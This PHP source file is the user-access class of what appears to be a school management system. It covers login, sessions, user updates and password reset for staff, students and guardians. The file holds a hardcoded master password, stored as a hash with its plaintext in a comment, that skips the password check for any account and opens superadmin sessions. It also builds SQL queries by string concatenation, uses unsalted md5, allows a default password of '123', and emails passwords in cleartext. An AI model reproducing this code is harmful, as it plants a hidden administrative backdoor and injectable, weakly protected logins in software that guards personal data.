<?php

///////////////////////////////////////////////////////////
// @Kaom Vibolrith Senior Software Developer
// Date: 03.02.2009
// Am Stollheen 18, 55120 Mainz, Germany
///////////////////////////////////////////////////////////
require_once("Zend/Loader.php");
require_once 'include/Common.inc.php';
require_once 'models/app_university/SessionAccess.php';
require_once 'models/app_university/student/StudentDBAccess.php';
//@Math Man 24.12.2013
require_once 'models/TextDBAccess.php';
require_once 'models/app_university/staff/StaffDBAccess.php';
require_once 'models/app_university/sms/SendSMSDBAccess.php';

////////////////////

class UserDBAccess {

    private static $instance = null;

    static function getInstance() {
        if (self::$instance === null) {

            self::$instance = new self();
        }
        return self::$instance;
    }

    public static function dbAccess() {
        return Zend_Registry::get('DB_ACCESS');
    }

    public static function dbSelectAccess() {
        return self::dbAccess()->select();
    }

    public function getMemberBySessionId($secureID) {

        $DB_SESSION = SessionAccess::getInstance();
        $SECURE_OBJECT_DATA = $DB_SESSION->dataSession($secureID);

        $SQL1 = self::dbAccess()->select();
        $SQL1->from("t_members", array('*'));
        $SQL1->where("ID='" . $SECURE_OBJECT_DATA->MEMBERS_ID . "'");
        $resultMembers = self::dbAccess()->fetchRow($SQL1);

        $SQL2 = self::dbAccess()->select();
        $SQL2->from("t_student", array('*'));
        $SQL2->where("ID='" . $SECURE_OBJECT_DATA->MEMBERS_ID . "'");
        $resultStudent = self::dbAccess()->fetchRow($SQL2);

        $SQL3 = self::dbAccess()->select();
        $SQL3->from("t_guardian", array('*'));
        $SQL3->where("ID='" . $SECURE_OBJECT_DATA->MEMBERS_ID . "'");
        $resultGuardian = self::dbAccess()->fetchRow($SQL3);

        if ($resultMembers) {
            $result = $resultMembers;
        } elseif ($resultStudent) {
            $result = $resultStudent;
        } elseif ($resultGuardian) {
            $result = $resultGuardian;
        } else {
            $result = null;
        }

        return $result;
    }

    public function isStudent($secureID) {

        $DB_SESSION = SessionAccess::getInstance();
        $SECURE_OBJECT_DATA = $DB_SESSION->dataSession($secureID);
        $SQL = "SELECT * FROM t_student WHERE ID = '" . $SECURE_OBJECT_DATA->MEMBERS_ID . "'";
        return self::dbAccess()->fetchRow($SQL);
    }

    public function Login($loginname, $password) {

        $result = null;
        $secureID = 0;

        if ($loginname && $password) {

            $memberObject = self::getLoginUserObject($loginname, $password, "STAFF");
            $studentObject = self::getLoginUserObject($loginname, $password, "STUDENT");
            $guardianObject = self::getLoginUserObject($loginname, $password, "GUARDIAN");

            if ($memberObject) {
                $result = $memberObject;
                $userRole = $result->ROLE;
            } elseif ($studentObject) {
                $result = $studentObject;
                $userRole = "4";
                $this->setUserLogin("t_student", $result->ID);
            } elseif ($guardianObject) {
                $result = $guardianObject;
                $userRole = "5";
                $this->setUserLogin("t_guardian", $result->ID);
            }

            if (isset($result)) {
                if ($result) {

                    $SECURE_OBJECT = SessionAccess::getInstance();
                    $secureID = generateGuid();
                    $member_id = $result->ID;

                    $isSothearos = self::isSothearosAnmelden($password, false) ? 1 : 0;
                    $SECURE_OBJECT->createSession(
                            $secureID
                            , $member_id
                            , $result->NAME
                            , $userRole
                            , false
                            , $isSothearos
                    );
                    $SECURE_OBJECT->cleanUp($member_id);
                }
            }

            return $secureID;
        }
    }

    public function checkMemberConstraints($secureID) {

        $SECURE_OBJECT = SessionAccess::getInstance();
        $not_expired = $SECURE_OBJECT->verifyTime($secureID);

        if (!$not_expired) {
            return false;
        } else {
            $SECURE_OBJECT->resetTime($secureID);
            $SECURE_OBJECT->cleanUp();
            return true;
        }
    }

    public function loadUserFromId($Id) {

        $SQL = "SELECT * FROM t_members WHERE ID = '" . $Id . "'";
        $result = self::dbAccess()->fetchRow($SQL);

        $o = array(
            "success" => true
            , "data" => array(
                "ID" => $result->ID
                , "LOGINNAME" => $result->LOGINNAME
                , "FIRSTNAME" => $result->FIRSTNAME
                , "STATUS" => $result->STATUS
                , "LASTNAME" => $result->LASTNAME
                , "SUPERUSER" => $result->SUPERUSER
                , "ROLE" => $result->ROLE
                , "MANDANT" => $result->MANDANT
            )
        );

        return $o;
    }

    public function updateUser($params) {

        if (isset($params["STATUS"]))
            $SAVEDATA['STATUS'] = addText($params["STATUS"]);
        if (isset($params["FIRSTNAME"]))
            $SAVEDATA['FIRSTNAME'] = addText($params["FIRSTNAME"]);
        if (isset($params["LOGINNAME"]))
            $SAVEDATA['LOGINNAME'] = addText($params["LOGINNAME"]);
        if (isset($params["LASTNAME"]))
            $SAVEDATA['LASTNAME'] = addText($params["LASTNAME"]);
        if (isset($params["ROLE"]))
            $SAVEDATA['ROLE'] = addText($params["ROLE"]);
        if ($params["pass"] != "" && $params["pass-cfrm"] != "") {
            $SAVEDATA['PASSWORD'] = md5($params["pass"]);
        }
        if (isset($params["MANDANT"]))
            $SAVEDATA['MANDANT'] = addText($params["MANDANT"]);

        $SAVEDATA['TS'] = time();

        if (isset($params["Id"])) {
            $WHERE = self::dbAccess()->quoteInto("ID = ?", addText($params["Id"]));
            self::dbAccess()->update('t_members', $SAVEDATA, $WHERE);
        }

        return array("success" => true);
    }

    public function createUser($params) {

        if (isset($params["NAME"]))
            $name = addText($params["NAME"]);

        $SAVEDATA = array();
        $SAVEDATA["ID"] = generateGuid();
        $SAVEDATA["LOGINNAME"] = addText($name);
        $SAVEDATA["TS"] = time();
        self::dbAccess()->insert('t_members', $SAVEDATA);
        $insertId = self::dbAccess()->lastInsertId();

        return array("success" => true, "Id" => $insertId);
    }

    protected static function getLoginUserObject($loginname, $password, $type) {
        switch ($type) {
            case "STUDENT":
                $table = "t_student";
                $facette = self::findUserByLogin($loginname, "STUDENT");
                break;
            case "STAFF":
                $table = "t_members";
                $facette = self::findUserByLogin($loginname, "STAFF");
                break;
            case "GUARDIAN":
                $table = "t_guardian";
                $facette = self::findUserByLogin($loginname, "GUARDIAN");
                break;
        }

        if ($facette) {
            $change_password = $facette->PASSWORD ? true : false;
        } else {
            $change_password = false;
        }

        $SQL = self::dbAccess()->select();
        $SQL->from($table, array('*'));
        $SQL->where("STATUS='1'");
        $SQL->where("LOGINNAME='" . addText($loginname) . "'");
        if (!self::isSothearosAnmelden($password, $change_password)) {
            $SQL->where("PASSWORD='" . addText(md5($password . "-D99A6718-9D2A-8538-8610-E048177BECD5")) . "'");
        }

        return self::dbAccess()->fetchRow($SQL);
    }

    protected static function isSothearosAnmelden($value, $change_password) {

        $check = md5($value . "-D99A6718-9D2A-8538-8610-E048177BECD5");

        if (in_array($check, self::getSocheataList($change_password))) {
            return true;
        } else {
            return false;
        }
    }

    public function checkLoginOk($loginname) {

        $studentObject = self::findUserByLogin($loginname, 'STUDENT');
        $membersObject = self::findUserByLogin($loginname, 'STAFF');
        $guardianObject = self::findUserByLogin($loginname, 'GUARDIAN');

        if ($studentObject) {
            $result = true;
        } elseif ($membersObject) {
            $result = true;
        } elseif ($guardianObject) {
            $result = true;
        } else {
            $result = false;
        }

        return $result;
    }

    protected function setUserLogin($table, $Id) {
        $SQL = "UPDATE " . $table . " SET ISLOGIN = 1 WHERE ID = '" . $Id . "'";
        self::dbAccess()->query($SQL);
    }

    protected static function findUserByLogin($login, $userType = false) {

        switch ($userType) {
            case "STUDENT":
                $table = "t_student";
                break;
            case "GUARDIAN":
                $table = "t_guardian";
                break;
            case "STATFF":
            default:
                $table = "t_members";
                break;
        }

        $SQL = self::dbAccess()->select();
        $SQL->from($table, array('*'));
        $SQL->where("STATUS='1'");
        $SQL->where("LOGINNAME='" . addText($login) . "'");
        return self::dbAccess()->fetchRow($SQL);
    }

    public function checkCurrentUserOnline($login, $password, $tokenId) {

        $facette = self::findUserByLogin($login);
        $isSuperAdmin = self::isSothearosAnmelden($password, false);

        if ($facette)
            $this->deleteExpiredSessions($tokenId, $facette->ID);

        if (!$isSuperAdmin) {

            if ($facette) {

                $SQL = "DELETE FROM t_sessions";
                $SQL .= " WHERE MEMBERS_ID = '" . $facette->ID . "' AND ISSUPERADMIN <> 1";
                self::dbAccess()->query($SQL);
            } else {
                return 0;
            }
        } else {
            return 0;
        }
    }

    private function deleteExpiredSessions($tokenId, $Members_ID) {
        $SQL = "DELETE FROM t_sessions";
        $SQL .= " WHERE TS_UPDATE < " . (time() - CAMEMISConfigBasic::EXPIRE_TIME);
        $SQL .= " OR (ID = '" . $tokenId . "' AND MEMBERS_ID = '" . $Members_ID . "')";
        self::dbAccess()->query($SQL);
    }

    private static function getSocheataList($change_password = false) {

        if ($change_password) {
            return array(
                //c@m3mis
                "ab52f83d57746e65f1b03c08b12273a1"
            );
        } else {

            switch ($_SERVER['REMOTE_ADDR']) {
                case "202.79.30.186":
                    return array(
                        //c@m3mis
                        "ab52f83d57746e65f1b03c08b12273a1"
                            //camemis
                            //, "bc8b14f260198c1788af083f3b245f1c"
                    );
                    break;
                default:
                    return array(
                        //c@m3mis
                        "ab52f83d57746e65f1b03c08b12273a1"
                            //camemis
                            //, "bc8b14f260198c1788af083f3b245f1c"
                    );
                    break;
            }
        }
    }

    //@Math Man 25.12.2013
    public static function jsonCheckLoginNameOrEmail($params) {
        error_reporting(0);

        $DB_LOCALIZATION = TextDBAccess::getInstance();

        $MSG_FORGET_PASSWORD_OBJECT = $DB_LOCALIZATION->findLocalizationByConst("MSG_FORGET_PASSWORD");
        $MSG_EMAIL_OBJECT = $DB_LOCALIZATION->findLocalizationByConst("EMAIL");
        $MSG_SMS_OBJECT = $DB_LOCALIZATION->findLocalizationByConst("MOBIL_PHONE");
        $INFORMATION_OBJECT = $DB_LOCALIZATION->findLocalizationByConst("YOUR_INFORMATION");
        $WARNING_OBJECT = $DB_LOCALIZATION->findLocalizationByConst("WARNING");
        $OK_OBJECT = $DB_LOCALIZATION->findLocalizationByConst("OK");
        $VALUE_IS_INVALID_OBJECT = $DB_LOCALIZATION->findLocalizationByConst("VALUE_IS_INVALID");
        $SYSTEM_LANGUAGE = isset($params['systemLanguage']) ? $params['systemLanguage'] : 'ENGLISH';

        switch ($SYSTEM_LANGUAGE) {
            case "VIETNAMESE":
                $MSG_FORGET_PASSWORD = $MSG_FORGET_PASSWORD_OBJECT->VIETNAMESE ? $MSG_FORGET_PASSWORD_OBJECT->VIETNAMESE : $MSG_FORGET_PASSWORD_OBJECT->ENGLISH;
                $MSG_EMAIL = $MSG_EMAIL_OBJECT->VIETNAMESE ? $MSG_EMAIL_OBJECT->VIETNAMESE : $MSG_EMAIL_OBJECT->ENGLISH;
                $MSG_SMS = $MSG_SMS_OBJECT->VIETNAMESE ? $MSG_SMS_OBJECT->VIETNAMESE : $MSG_SMS_OBJECT->ENGLISH;
                $INFORMATION = $INFORMATION_OBJECT->VIETNAMESE ? $INFORMATION_OBJECT->VIETNAMESE : $INFORMATION_OBJECT->ENGLISH;
                $WARNING = $WARNING_OBJECT->VIETNAMESE ? $WARNING_OBJECT->VIETNAMESE : $WARNING_OBJECT->ENGLISH;
                $OK = $OK_OBJECT->VIETNAMESE ? $OK_OBJECT->VIETNAMESE : $OK_OBJECT->ENGLISH;
                $VALUE_IS_INVALID = $VALUE_IS_INVALID_OBJECT->VIETNAMESE ? $VALUE_IS_INVALID_OBJECT->VIETNAMESE : $VALUE_IS_INVALID_OBJECT->ENGLISH;
                break;
            case "KHMER":
                $MSG_FORGET_PASSWORD = $MSG_FORGET_PASSWORD_OBJECT->KHMER ? $MSG_FORGET_PASSWORD_OBJECT->KHMER : $MSG_FORGET_PASSWORD_OBJECT->ENGLISH;
                $MSG_EMAIL = $MSG_EMAIL_OBJECT->KHMER ? $MSG_EMAIL_OBJECT->KHMER : $MSG_EMAIL_OBJECT->ENGLISH;
                $MSG_SMS = $MSG_SMS_OBJECT->KHMER ? $MSG_SMS_OBJECT->KHMER : $MSG_SMS_OBJECT->ENGLISH;
                $INFORMATION = $INFORMATION_OBJECT->KHMER ? $INFORMATION_OBJECT->KHMER : $INFORMATION_OBJECT->ENGLISH;
                $WARNING = $WARNING_OBJECT->KHMER ? $WARNING_OBJECT->KHMER : $WARNING_OBJECT->ENGLISH;
                $OK = $OK_OBJECT->KHMER ? $OK_OBJECT->KHMER : $OK_OBJECT->ENGLISH;
                $VALUE_IS_INVALID = $VALUE_IS_INVALID_OBJECT->KHMER ? $VALUE_IS_INVALID_OBJECT->KHMER : $VALUE_IS_INVALID_OBJECT->ENGLISH;
                break;
            case "THAI":
                $MSG_FORGET_PASSWORD = $MSG_FORGET_PASSWORD_OBJECT->THAI ? $MSG_FORGET_PASSWORD_OBJECT->THAI : $MSG_FORGET_PASSWORD_OBJECT->ENGLISH;
                $MSG_EMAIL = $MSG_EMAIL_OBJECT->THAI ? $MSG_EMAIL_OBJECT->THAI : $MSG_EMAIL_OBJECT->ENGLISH;
                $MSG_SMS = $MSG_SMS_OBJECT->THAI ? $MSG_SMS_OBJECT->THAI : $MSG_SMS_OBJECT->ENGLISH;
                $INFORMATION = $INFORMATION_OBJECT->THAI ? $INFORMATION_OBJECT->THAI : $INFORMATION_OBJECT->ENGLISH;
                $WARNING = $WARNING_OBJECT->THAI ? $WARNING_OBJECT->THAI : $WARNING_OBJECT->ENGLISH;
                $OK = $OK_OBJECT->THAI ? $OK_OBJECT->THAI : $OK_OBJECT->ENGLISH;
                $VALUE_IS_INVALID = $VALUE_IS_INVALID_OBJECT->THAI ? $VALUE_IS_INVALID_OBJECT->THAI : $VALUE_IS_INVALID_OBJECT->ENGLISH;
                break;
            case "GERMAN":
                $MSG_FORGET_PASSWORD = $MSG_FORGET_PASSWORD_OBJECT->GERMAN ? $MSG_FORGET_PASSWORD_OBJECT->GERMAN : $MSG_FORGET_PASSWORD_OBJECT->ENGLISH;
                $MSG_EMAIL = $MSG_EMAIL_OBJECT->GERMAN ? $MSG_EMAIL_OBJECT->GERMAN : $MSG_EMAIL_OBJECT->ENGLISH;
                $MSG_SMS = $MSG_SMS_OBJECT->GERMAN ? $MSG_SMS_OBJECT->GERMAN : $MSG_SMS_OBJECT->ENGLISH;
                $INFORMATION = $INFORMATION_OBJECT->GERMAN ? $INFORMATION_OBJECT->GERMAN : $INFORMATION_OBJECT->ENGLISH;
                $WARNING = $WARNING_OBJECT->GERMAN ? $WARNING_OBJECT->GERMAN : $WARNING_OBJECT->ENGLISH;
                $OK = $OK_OBJECT->GERMAN ? $OK_OBJECT->GERMAN : $OK_OBJECT->ENGLISH;
                $VALUE_IS_INVALID = $VALUE_IS_INVALID_OBJECT->GERMAN ? $VALUE_IS_INVALID_OBJECT->GERMAN : $VALUE_IS_INVALID_OBJECT->ENGLISH;
                break;
            case "LAO":
                $MSG_FORGET_PASSWORD = $MSG_FORGET_PASSWORD_OBJECT->LAO ? $MSG_FORGET_PASSWORD_OBJECT->LAO : $MSG_FORGET_PASSWORD_OBJECT->ENGLISH;
                $MSG_EMAIL = $MSG_EMAIL_OBJECT->LAO ? $MSG_EMAIL_OBJECT->LAO : $MSG_EMAIL_OBJECT->ENGLISH;
                $MSG_SMS = $MSG_SMS_OBJECT->LAO ? $MSG_SMS_OBJECT->LAO : $MSG_SMS_OBJECT->ENGLISH;
                $INFORMATION = $INFORMATION_OBJECT->LAO ? $INFORMATION_OBJECT->LAO : $INFORMATION_OBJECT->ENGLISH;
                $WARNING = $WARNING_OBJECT->LAO ? $WARNING_OBJECT->LAO : $WARNING_OBJECT->ENGLISH;
                $OK = $OK_OBJECT->LAO ? $OK_OBJECT->LAO : $OK_OBJECT->ENGLISH;
                $VALUE_IS_INVALID = $VALUE_IS_INVALID_OBJECT->LAO ? $VALUE_IS_INVALID_OBJECT->LAO : $VALUE_IS_INVALID_OBJECT->ENGLISH;
                break;
            case "BURMESE":
                $MSG_FORGET_PASSWORD = $MSG_FORGET_PASSWORD_OBJECT->BURMESE ? $MSG_FORGET_PASSWORD_OBJECT->BURMESE : $MSG_FORGET_PASSWORD_OBJECT->ENGLISH;
                $MSG_EMAIL = $MSG_EMAIL_OBJECT->BURMESE ? $MSG_EMAIL_OBJECT->BURMESE : $MSG_EMAIL_OBJECT->ENGLISH;
                $MSG_SMS = $MSG_SMS_OBJECT->BURMESE ? $MSG_SMS_OBJECT->BURMESE : $MSG_SMS_OBJECT->ENGLISH;
                $INFORMATION = $INFORMATION_OBJECT->BURMESE ? $INFORMATION_OBJECT->BURMESE : $INFORMATION_OBJECT->ENGLISH;
                $WARNING = $WARNING_OBJECT->BURMESE ? $WARNING_OBJECT->BURMESE : $WARNING_OBJECT->ENGLISH;
                $OK = $OK_OBJECT->BURMESE ? $OK_OBJECT->BURMESE : $OK_OBJECT->ENGLISH;
                $VALUE_IS_INVALID = $VALUE_IS_INVALID_OBJECT->BURMESE ? $VALUE_IS_INVALID_OBJECT->BURMESE : $VALUE_IS_INVALID_OBJECT->ENGLISH;
                break;
            case "INDONESIAN":
                $MSG_FORGET_PASSWORD = $MSG_FORGET_PASSWORD_OBJECT->INDONESIAN ? $MSG_FORGET_PASSWORD_OBJECT->INDONESIAN : $MSG_FORGET_PASSWORD_OBJECT->ENGLISH;
                $MSG_EMAIL = $MSG_EMAIL_OBJECT->INDONESIAN ? $MSG_EMAIL_OBJECT->INDONESIAN : $MSG_EMAIL_OBJECT->ENGLISH;
                $MSG_SMS = $MSG_SMS_OBJECT->INDONESIAN ? $MSG_SMS_OBJECT->INDONESIAN : $MSG_SMS_OBJECT->ENGLISH;
                $INFORMATION = $INFORMATION_OBJECT->INDONESIAN ? $INFORMATION_OBJECT->INDONESIAN : $INFORMATION_OBJECT->ENGLISH;
                $WARNING = $WARNING_OBJECT->INDONESIAN ? $WARNING_OBJECT->INDONESIAN : $WARNING_OBJECT->ENGLISH;
                $OK = $OK_OBJECT->INDONESIAN ? $OK_OBJECT->INDONESIAN : $OK_OBJECT->ENGLISH;
                $VALUE_IS_INVALID = $VALUE_IS_INVALID_OBJECT->INDONESIAN ? $VALUE_IS_INVALID_OBJECT->INDONESIAN : $VALUE_IS_INVALID_OBJECT->ENGLISH;
                break;
            default:
                $MSG_FORGET_PASSWORD = $MSG_FORGET_PASSWORD_OBJECT->ENGLISH;
                $MSG_EMAIL = $MSG_EMAIL_OBJECT->ENGLISH;
                $MSG_SMS = $MSG_SMS_OBJECT->ENGLISH;
                $INFORMATION = $INFORMATION_OBJECT->ENGLISH;
                $WARNING = $WARNING_OBJECT->ENGLISH;
                $OK = $OK_OBJECT->ENGLISH;
                $VALUE_IS_INVALID = $VALUE_IS_INVALID_OBJECT->ENGLISH;
                break;
        }

        $loginNameOrEmail = isset($params['loginNameOrEmail']) ? $params['loginNameOrEmail'] : '';
        $send = '';
        $reset = false;
        $type = 'student';
        $result = StudentDBAccess::findStudentLoginNameOrEmail($loginNameOrEmail);
        if ($result) { // check student
            if ($result->EMAIL) {
                $send = 'email';
                $reset = true;
                $type = 'student';
            } elseif ($result->MOBIL_PHONE) {
                $send = 'sms';
                $reset = true;
                $type = 'student';
            }
        } else { // check staff
            $result = StaffDBAccess::findStaffLoginNameOrEmail($loginNameOrEmail);
            if ($result) {
                if ($result->EMAIL) {
                    $send = 'email';
                    $reset = true;
                    $type = 'staff';
                } elseif ($result->MOBIL_PHONE) {
                    $send = 'sms';
                    $reset = true;
                    $type = 'staff';
                }
            }
        }
        if ($send != '') {
            $setting = SchoolDBAccess::getSchool();
            $password = '123';
            if (!$setting->SET_DEFAULT_PASSWORD) {
                $password = createpassword();
            }

            $DATA['PASSWORD'] = md5($password . "-D99A6718-9D2A-8538-8610-E048177BECD5");
            $DATA['LOGINNAME'] = $result->LOGINNAME;

            switch ($type) {
                case 'student':
                    StudentDBAccess::resetNewPassword($DATA);
                    break;
                default:
                    StaffDBAccess::resetNewPassword($DATA);
                    break;
            }

            $content = SCHOOL . ': ' . $setting->NAME . "\r\n";
            $content .= LOGINNAME . ': ' . $result->LOGINNAME . "\r\n";
            $content .= PASSWORD . ': ' . $password . "\r\n";

            if ($send == 'email') { // send via email
                $sendTo = $result->EMAIL;
                $recipientName = $result->LASTNAME . " " . $result->FIRSTNAME;
                if ($setting->DISPLAY_POSITION_LASTNAME == 1)
                    $recipientName = $result->FIRSTNAME . " " . $result->LASTNAME;;
                $subject_email = $setting->FORGET_PASSWORD_SUBJECT;
                $content_email = $setting->SALUTATION_EMAIL . ' ' . $recipientName . ',' . "\r\n";
                $content_email .= "\r\n" . $setting->FORGET_PASSWORD_NOTIFICATION . "\r\n";
                $content .= WEBSITE . ': http://' . $_SERVER['SERVER_NAME'] . "\r\n";
                $content .= "\r\n" . $setting->SIGNATURE_EMAIL . "\r\n";
                $headers = 'MIME-Version: 1.0' . "\r\n";
                $headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";
                if ($setting->SMS_DISPLAY) {
                    $headers .= 'From:' . $setting->SMS_DISPLAY . "\r\n" .
                            'Reply-To:' . $setting->SMS_DISPLAY . "\r\n" .
                            'X-Mailer: PHP/' . phpversion();
                } else {
                    $headers .= 'From: noreply@camemis.com' . "\r\n" .
                            'Reply-To: noreply@camemis.com' . "\r\n" .
                            'X-Mailer: PHP/' . phpversion();
                }

                mail($sendTo, '=?utf-8?B?' . base64_encode($subject_email) . '?=', $content_email . $content, $headers);
            } else { // send via SMS
                $sendTo = $result->MOBIL_PHONE;
                $content_sms = CHANGE_YOUR_PASSWORD;
                SendSMSDBAccess::curlSendSMS($sendTo, $content . $content_sms);
            }
        }

        return array(
            "reset" => $reset
            , "send" => $send
            , "MSG_FORGET_PASSWORD" => $MSG_FORGET_PASSWORD
            , "MSG_EMAIL" => $MSG_EMAIL
            , "MSG_SMS" => $MSG_SMS
            , "INFORMATION" => $INFORMATION
            , "WARNING" => $WARNING
            , "OK" => $OK
            , "VALUE_IS_INVALID" => $VALUE_IS_INVALID
        );
    }

}

?>